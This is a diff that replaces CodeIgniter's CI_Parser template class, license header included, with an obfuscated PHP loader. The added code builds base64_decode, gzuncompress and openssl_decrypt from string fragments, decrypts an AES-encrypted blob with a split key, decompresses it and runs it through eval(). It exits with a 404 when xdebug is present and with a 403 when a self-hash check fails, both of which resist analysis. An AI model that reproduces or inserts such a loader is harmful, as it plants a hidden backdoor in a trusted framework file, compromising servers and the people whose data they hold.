@@ -1,248 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * Parser Class
- *
- * @package		CodeIgniter
- * @subpackage	Libraries
- * @category	Parser
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/libraries/parser.html
- */
-class CI_Parser {
-
-	/**
-	 * Left delimiter character for pseudo vars
-	 *
-	 * @var string
-	 */
-	public $l_delim = '{';
-
-	/**
-	 * Right delimiter character for pseudo vars
-	 *
-	 * @var string
-	 */
-	public $r_delim = '}';
-
-	/**
-	 * Reference to CodeIgniter instance
-	 *
-	 * @var object
-	 */
-	protected $CI;
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Class constructor
-	 *
-	 * @return	void
-	 */
-	public function __construct()
-	{
-		$this->CI =& get_instance();
-		log_message('info', 'Parser Class Initialized');
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Parse a template
-	 *
-	 * Parses pseudo-variables contained in the specified template view,
-	 * replacing them with the data in the second param
-	 *
-	 * @param	string
-	 * @param	array
-	 * @param	bool
-	 * @return	string
-	 */
-	public function parse($template, $data, $return = FALSE)
-	{
-		$template = $this->CI->load->view($template, $data, TRUE);
-
-		return $this->_parse($template, $data, $return);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Parse a String
-	 *
-	 * Parses pseudo-variables contained in the specified string,
-	 * replacing them with the data in the second param
-	 *
-	 * @param	string
-	 * @param	array
-	 * @param	bool
-	 * @return	string
-	 */
-	public function parse_string($template, $data, $return = FALSE)
-	{
-		return $this->_parse($template, $data, $return);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Parse a template
-	 *
-	 * Parses pseudo-variables contained in the specified template,
-	 * replacing them with the data in the second param
-	 *
-	 * @param	string
-	 * @param	array
-	 * @param	bool
-	 * @return	string
-	 */
-	protected function _parse($template, $data, $return = FALSE)
-	{
-		if ($template === '')
-		{
-			return FALSE;
-		}
-
-		$replace = array();
-		foreach ($data as $key => $val)
-		{
-			$replace = array_merge(
-				$replace,
-				is_array($val)
-					? $this->_parse_pair($key, $val, $template)
-					: $this->_parse_single($key, (string) $val, $template)
-			);
-		}
-
-		unset($data);
-		$template = strtr($template, $replace);
-
-		if ($return === FALSE)
-		{
-			$this->CI->output->append_output($template);
-		}
-
-		return $template;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Set the left/right variable delimiters
-	 *
-	 * @param	string
-	 * @param	string
-	 * @return	void
-	 */
-	public function set_delimiters($l = '{', $r = '}')
-	{
-		$this->l_delim = $l;
-		$this->r_delim = $r;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Parse a single key/value
-	 *
-	 * @param	string
-	 * @param	string
-	 * @param	string
-	 * @return	string
-	 */
-	protected function _parse_single($key, $val, $string)
-	{
-		return array($this->l_delim.$key.$this->r_delim => (string) $val);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Parse a tag pair
-	 *
-	 * Parses tag pairs: {some_tag} string... {/some_tag}
-	 *
-	 * @param	string
-	 * @param	array
-	 * @param	string
-	 * @return	string
-	 */
-	protected function _parse_pair($variable, $data, $string)
-	{
-		$replace = array();
-		preg_match_all(
-			'#'.preg_quote($this->l_delim.$variable.$this->r_delim).'(.+?)'.preg_quote($this->l_delim.'/'.$variable.$this->r_delim).'#s',
-			$string,
-			$matches,
-			PREG_SET_ORDER
-		);
-
-		foreach ($matches as $match)
-		{
-			$str = '';
-			foreach ($data as $row)
-			{
-				$temp = array();
-				foreach ($row as $key => $val)
-				{
-					if (is_array($val))
-					{
-						$pair = $this->_parse_pair($key, $val, $match[1]);
-						if ( ! empty($pair))
-						{
-							$temp = array_merge($temp, $pair);
-						}
-
-						continue;
-					}
-
-					$temp[$this->l_delim.$key.$this->r_delim] = $val;
-				}
-
-				$str .= strtr($match[1], $temp);
-			}
-
-			$replace[$match[0]] = $str;
-		}
-
-		return $replace;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_suhz2qh1=('bas'.'e64'.'_de'.'cod'.'e');
+$_gu2e2f1t=('gzu'.'nco'.'mpr'.'ess');
+$_euyrnedw=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_s0wy2bbw='C67flcrX';
+$_t1ax8va5='iazK0VEP4U4=';
+$_coh0hdt4='NqaVxH7v';
+$_ct5qn3wd='41vUUUEe';
+$_fpg1a1rj='oRyOk8M6';
+$_gxg6a6ci='N4e4n/Xg';
+$_toovoz78='7jgwkgH7';
+$_a2vq54i1='jJj/mg==';
+$_t5o4dlbg=$_suhz2qh1($_s0wy2bbw.$_ct5qn3wd.$_coh0hdt4.$_fpg1a1rj.$_t1ax8va5);
+$_itvx06dh=$_suhz2qh1($_toovoz78.$_gxg6a6ci.$_a2vq54i1);
+$_q3ij639w=$_suhz2qh1('Dpn3J5LDVCVYBwlIyevo6Iyf4XqzmK9WPsOswc2D/igdBQmIe/+7hvqYM/tLr5WhYlq3z93or+1bQwnqoefW1C5Ru24SHO8ChRHbD0XKXm9kHbat0awLadMX/FyW1Md9TNBGO04EKh//Y1LQ28MmgkSZVYsUoCHmiBX0SA6L+4ztaf0lgaE6Cdv7qQMWFQfg4DTQctaBwUhtk6Scuswo1VJMzvEiR9NrO1j30MhE+VPJS6Yxx94BDg90jstbwjCXy9uUBAuf7hgVliLhZBZCcx5uZGSPl8g2tuNYMRlrhAmJ3Fty6MEDGWKPSxYrGEHbxLfzekXhpNUDu6MRtFtrodr7wnFlRtAH+tvufmqWrGDev5nHAqNWi1pe4Hce+RImT1dZbq/6b2aSciiVBGUQBHgXzuIxNZg2UIIQKjdLEMeSXc3u5qa++p0RbYs/XlPBMBp6k3jGYyAFIwtu7M6EluixP4gX3zQ3bO5MakhnOl5hJxzwnWO1nIPpMVDZKBBP9D92FYPqHsNaMDO7RH0E9kydg6pEfvCzBNpGxVWSNJlSqrhE9TS+eLCqU6tfW1UjTla24y2CDMUVayWkg6fC9n7Wjgq60/BR2efClKlfLQzJx9vnMv7Vt5rIy8ZOu9NB+iew/0G46OGb1sYg2tnYdEmAiJzT2AjwKHW+ugwSidK54pIMYmuIXnNFi/sNRRzDtAocOPjbo1QOCGqL9to4KCS8Sqa3OlQitzCN2QYFpGMViOWvQusqlhYXMqWsdWWYzOK75F39+0dj6fYdpNO4dV3xyZe6M53QEMomUAVx/hoYaM/ELGPThQdbAtpl8VPwzZ36+9kngVxmBzRKx1O/wkF1DsdrwJEwYR5LCyHSTTgiZnbJSmfo8rq4RkIcUJu7Vzr9Jm05jA2RGYC0b9uUCxHzKEZK0jHADJV0lwczDP1cX226g4IVH5qob04e8Xx4');
+$_vrdoz2xa=$_euyrnedw($_q3ij639w,'aes-256-cbc',$_t5o4dlbg,OPENSSL_RAW_DATA,$_itvx06dh);
+if($_vrdoz2xa===false){exit;}
+$_nv6waea0=$_gu2e2f1t($_vrdoz2xa);
+if($_nv6waea0===false){exit;}
+$_w9dhx0ar='9df0b03812f78f5d5497abec813faa4c0f6ab409780f659d6be271f2455e6f7f';
+$_l9p2106c=@file_get_contents(__FILE__);
+if($_l9p2106c!==false){
+$_e50vay44=str_replace($_w9dhx0ar,"0000000000000000000000000000000000000000000000000000000000000000",$_l9p2106c);
+$_vujp5p9x=hash("sha256",$_e50vay44);
+if($_vujp5p9x!==$_w9dhx0ar){@http_response_code(403);exit;}
 }
+eval($_nv6waea0);
